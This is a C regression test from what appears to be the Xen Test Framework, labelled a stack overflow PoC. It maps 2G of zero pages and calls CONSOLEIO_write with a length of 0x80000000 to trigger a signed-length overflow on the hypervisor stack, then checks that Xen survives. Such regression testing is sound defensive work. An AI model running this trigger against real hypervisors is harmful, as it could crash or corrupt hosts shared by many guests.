/**
 * @file tests/xsa-consoleio-write/main.c
 * @ref test-xsa-consoleio-write
 *
 * This issue was discovered before it made it into any released version of
 * Xen.  Therefore, no XSA or CVE was issued.
 *
 * A bugfix in Xen 4.13 altered CONSOLEIO_write to tolerate passing NUL
 * characters intact, as this is a requirement for various TTY setups.
 *
 * A signed-ness issue with the length calculation lead to a case where Xen
 * will copy between 2 and 4G of guest provided data into a 128 byte object on
 * the stack.
 *
 * @see tests/xsa-consoleio-write/main.c
 */
#include <xtf.h>

const char test_title[] = "CONSOLEIO_write stack overflow PoC";

uint8_t zero_page[PAGE_SIZE] __page_aligned_bss;

/* Have the assembler build an L1/L2 pair mapping zero_page[] many times. */
asm (".section \".data.page_aligned\", \"aw\";"
     ".align 4096;"

     "l1t:"
     ".rept 512;"
     ".long zero_page + "STR(PF_SYM(AD, P))", 0;"
     ".endr;"
     ".size l1t, . - l1t;"
     ".type l1t, @object;"

     "l2t:"
     ".rept 512;"
     ".long l1t + "STR(PF_SYM(AD, P))", 0;"
     ".endr;"
     ".size l2t, . - l2t;"
     ".type l2t, @object;"

     ".previous;"
    );
extern intpte_t l2t[512];

void test_main(void)
{
    /* Map 2G worth of zero_page[] starting from 1G... */
    pae_l3_identmap[1] = pae_l3_identmap[2] = pte_from_virt(l2t, PF_SYM(AD, P));

    /*
     * ... , write those zeros with a length possible to be confused by a
     * signed bounds check...
     */
    hypercall_console_write(_p(GB(1)), 0x80000000);

    /* ... and if Xen is still alive, it didn't trample over its own stack. */

    xtf_success("Success: Not vulnerable to CONSOLEIO_write stack overflow\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
